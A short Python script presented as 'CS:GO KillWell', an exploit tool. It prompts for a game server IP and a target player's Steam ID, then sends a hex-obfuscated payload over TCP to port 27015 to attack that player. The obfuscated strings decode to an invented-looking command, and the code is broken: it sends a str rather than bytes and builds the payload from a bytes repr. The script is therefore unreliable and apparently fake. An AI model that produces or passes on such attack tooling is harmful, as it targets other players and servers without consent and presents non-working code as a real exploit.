import socket

PAYLOAD_FIRST   = "\x56\x41\x4C\x56\x45\x5F\x53\x45\x52\x56\x45\x52\x3A\x43\x4F\x4E\x4E\x45\x43\x54\x49\x4F\x4E\x43\x4C\x49\x45\x4E\x54\x28" # Don't touch this
PAYLOAD_SECOND  = "\x29\x3A\x42\x4F\x54\x53\x5F\x41\x54\x54\x41\x43\x4B\x5F\x50\x52\x4F\x54\x4F\x54\x59\x50\x45\x5F\x30\x30\x30\x34" # Or this.

def encode_payload(steam_id):
    print("Encoding payload with steam ID...")
    return PAYLOAD_FIRST + str(steam_id.encode()) + PAYLOAD_SECOND

def run_exploit(ip, s_id, port: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    
    sock.send(encode_payload(s_id))
    sock.close()
    
    print("Ran exploit...")

def main():
    print("CS:GO KillWell ver3.9 | Updated 9/13/2022")
    server_ip = input("SERVER IP: ")
    target_id = input("TARGET ID: ") # Use STEAM ID HERE
    
    run_exploit(server_ip, target_id, 27015)
    exit(1)
    
if __name__ == '__main__':
    main()
